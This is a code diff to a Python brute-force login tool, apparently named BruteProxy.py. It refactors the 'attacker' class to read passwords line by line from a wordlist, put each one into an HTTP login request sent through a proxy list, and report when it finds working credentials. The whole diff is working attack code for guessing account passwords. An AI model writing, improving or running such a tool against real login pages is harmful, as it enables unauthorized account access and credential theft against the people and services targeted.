@@ -2,6 +2,7 @@ import requests
 from Modules.Utilities import utilities
 import json
 import re
+import linecache
 
 class colors:
     HEADER = '\033[95m'
@@ -18,17 +19,13 @@ class colors:
 
 class attacker:
 
-    # convert .txt file to big wordlist and proxylist dictonary
-    def generateDicts(self, wordlistPath, proxylistPath):
-        # generate wordlist
-        a_file = open(wordlistPath, "r")
-        attacker.wordlist = [(line.strip()).split() for line in a_file]
-        a_file.close()
+    # prepare dicts
+    def prepareDicts(self, wordlistPath, proxylistPath):
+        # count the lines in wordlist by file_len() utility
+        attacker.wordlist_len = utilities.file_len(0, wordlistPath)
 
-        # generate proxylist
-        b_file = open(proxylistPath, "r")
-        attacker.proxylist = [(line.strip()).split() for line in b_file]
-        b_file.close()
+        # count the lines in proxylist by file_len() utility
+        attacker.proxylist_len = utilities.file_len(0, proxylistPath)
 
     def setup(self, method, custom_request):
         attacker.method = method
@@ -55,23 +52,22 @@ class attacker:
 
         # firstly, let's generate some dicts AND error handle this process, since this is very fishy
         try:
-            attacker.generateDicts(0, wordlist, proxylist)
+            attacker.prepareDicts(0, wordlist, proxylist)
 
-            # yay! dicts successfully generated, now let's check one more thing before we get started
+            # yay! dicts successfully prepared, now let's check one more thing before we get started
             # check if both wordlist and proxylist contains atleast 5 items
-            if len(attacker.wordlist) >= 5:
+            if attacker.wordlist_len >= 5:
                 # wordlist has, now let's look at the proxylist
-                if len(attacker.proxylist) >= 5:
+                if attacker.proxylist_len >= 5:
                     # now we're really set up to begin the attack!
                     # this process is very fishy too, we must handle that with care
                     try:
                         print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Executing attack, we'll let you know if we find something..." + colors.ENDC)
-                        for currentPwdNum in range(0, len(attacker.wordlist)):
+                        for currentPwdLine in range(1, attacker.wordlist_len):
                             # prepare paswords in current try
-                            password = attacker.wordlist[currentPwdNum]
-                            human_readble_pwd = str(password).replace("[", "").replace("]", "").replace("'", "")
+                            password = linecache.getline(wordlist, currentPwdLine).strip()
                             # replace variables in template and convert it into dict
-                            request_template = request_template_raw.replace("$username$", username).replace("$password$", human_readble_pwd)
+                            request_template = request_template_raw.replace("$username$", username).replace("$password$", password).replace("$username_parameter$", username_parameter).replace("$password_parameter$", password_parameter)
                             currentRequestObj = json.loads(request_template)
 
                             # decide on GET or POST method
@@ -92,14 +88,14 @@ class attacker:
                                 # greet a user with a great news
                                 print(colors.OKCYAN + "[" + colors.OKGREEN + colors.BOLD + "\u2713" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "SUCCESS! Correct credentials were found. Enjoy and thank you for using BruteProxy.py :)" + colors.ENDC)
                                 print(colors.OKCYAN + "[] " + colors.ENDC + "     " + colors.BOLD + "Username: " + colors.ENDC + username)
-                                print(colors.OKCYAN + "[] " + colors.ENDC + "     " + colors.BOLD + "Password: " + colors.ENDC + human_readble_pwd)
+                                print(colors.OKCYAN + "[] " + colors.ENDC + "     " + colors.BOLD + "Password: " + colors.ENDC + password)
 
                                 # before we actaully end loop, if the user has not specified or wrongly specified the error identifier, the very first password will popup
                                 # as correct, since it did not find that value in response, so we can theoretically detect that and only inform the user about this
-                                if currentPwdNum == 0:
+                                if currentPwdLine == 1:
                                     print(colors.OKCYAN + "[]" + colors.ENDC)
                                     print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Note that the very first password in wordlist was detected as correct." + colors.ENDC)
-                                    print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Please make sure that everything is set up correctly, especially error_identifier." + colors.ENDC)
+                                    print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Please make sure that everything is set up correctly, especially error_identifier and target." + colors.ENDC)
                                 # end loop
                                 break
                             elif currentResponse__code >= 400:
